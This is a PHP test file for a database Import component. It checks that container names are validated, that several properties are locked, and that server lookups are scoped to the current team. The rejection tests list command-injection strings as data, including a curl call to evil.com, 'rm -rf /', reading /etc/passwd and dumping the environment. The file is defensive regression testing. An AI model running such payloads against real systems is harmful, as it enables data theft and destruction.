<?php

use App\Livewire\Project\Database\Import;
use App\Support\ValidationPatterns;

describe('container name validation', function () {
    test('isValidContainerName accepts valid container names', function () {
        expect(ValidationPatterns::isValidContainerName('my-container'))->toBeTrue();
        expect(ValidationPatterns::isValidContainerName('my_container'))->toBeTrue();
        expect(ValidationPatterns::isValidContainerName('container123'))->toBeTrue();
        expect(ValidationPatterns::isValidContainerName('my.container.name'))->toBeTrue();
        expect(ValidationPatterns::isValidContainerName('a'))->toBeTrue();
        expect(ValidationPatterns::isValidContainerName('abc-def_ghi.jkl'))->toBeTrue();
    });

    test('isValidContainerName rejects command injection payloads', function () {
        // Command substitution
        expect(ValidationPatterns::isValidContainerName('$(curl http://evil.com/$(whoami))'))->toBeFalse();
        expect(ValidationPatterns::isValidContainerName('$(whoami)'))->toBeFalse();

        // Backtick injection
        expect(ValidationPatterns::isValidContainerName('`id`'))->toBeFalse();

        // Semicolon chaining
        expect(ValidationPatterns::isValidContainerName('container;rm -rf /'))->toBeFalse();

        // Pipe injection
        expect(ValidationPatterns::isValidContainerName('container|cat /etc/passwd'))->toBeFalse();

        // Ampersand chaining
        expect(ValidationPatterns::isValidContainerName('container&&env'))->toBeFalse();

        // Spaces (not valid in Docker container names)
        expect(ValidationPatterns::isValidContainerName('container name'))->toBeFalse();

        // Newlines
        expect(ValidationPatterns::isValidContainerName("container\nid"))->toBeFalse();

        // Must start with alphanumeric
        expect(ValidationPatterns::isValidContainerName('-container'))->toBeFalse();
        expect(ValidationPatterns::isValidContainerName('.container'))->toBeFalse();
        expect(ValidationPatterns::isValidContainerName('_container'))->toBeFalse();
    });
});

describe('locked properties', function () {
    test('container property has Locked attribute', function () {
        $property = new ReflectionProperty(Import::class, 'container');
        $attributes = $property->getAttributes(\Livewire\Attributes\Locked::class);

        expect($attributes)->not->toBeEmpty();
    });

    test('serverId property has Locked attribute', function () {
        $property = new ReflectionProperty(Import::class, 'serverId');
        $attributes = $property->getAttributes(\Livewire\Attributes\Locked::class);

        expect($attributes)->not->toBeEmpty();
    });

    test('resourceId property has Locked attribute', function () {
        $property = new ReflectionProperty(Import::class, 'resourceId');
        $attributes = $property->getAttributes(\Livewire\Attributes\Locked::class);

        expect($attributes)->not->toBeEmpty();
    });

    test('resourceType property has Locked attribute', function () {
        $property = new ReflectionProperty(Import::class, 'resourceType');
        $attributes = $property->getAttributes(\Livewire\Attributes\Locked::class);

        expect($attributes)->not->toBeEmpty();
    });

    test('resourceUuid property has Locked attribute', function () {
        $property = new ReflectionProperty(Import::class, 'resourceUuid');
        $attributes = $property->getAttributes(\Livewire\Attributes\Locked::class);

        expect($attributes)->not->toBeEmpty();
    });

    test('resourceDbType property has Locked attribute', function () {
        $property = new ReflectionProperty(Import::class, 'resourceDbType');
        $attributes = $property->getAttributes(\Livewire\Attributes\Locked::class);

        expect($attributes)->not->toBeEmpty();
    });
});

describe('server method uses team scoping', function () {
    test('server computed property calls ownedByCurrentTeam', function () {
        $method = new ReflectionMethod(Import::class, 'server');

        // Extract the server method body
        $startLine = $method->getStartLine();
        $endLine = $method->getEndLine();
        $lines = array_slice(file($method->getFileName()), $startLine - 1, $endLine - $startLine + 1);
        $methodBody = implode('', $lines);

        expect($methodBody)->toContain('ownedByCurrentTeam');
        expect($methodBody)->not->toContain('Server::find($this->serverId)');
    });
});

describe('Import component uses shared ValidationPatterns', function () {
    test('runImport references ValidationPatterns for container validation', function () {
        $method = new ReflectionMethod(Import::class, 'runImport');
        $startLine = $method->getStartLine();
        $endLine = $method->getEndLine();
        $lines = array_slice(file($method->getFileName()), $startLine - 1, $endLine - $startLine + 1);
        $methodBody = implode('', $lines);

        expect($methodBody)->toContain('ValidationPatterns::isValidContainerName');
    });

    test('restoreFromS3 references ValidationPatterns for container validation', function () {
        $method = new ReflectionMethod(Import::class, 'restoreFromS3');
        $startLine = $method->getStartLine();
        $endLine = $method->getEndLine();
        $lines = array_slice(file($method->getFileName()), $startLine - 1, $endLine - $startLine + 1);
        $methodBody = implode('', $lines);

        expect($methodBody)->toContain('ValidationPatterns::isValidContainerName');
    });
});
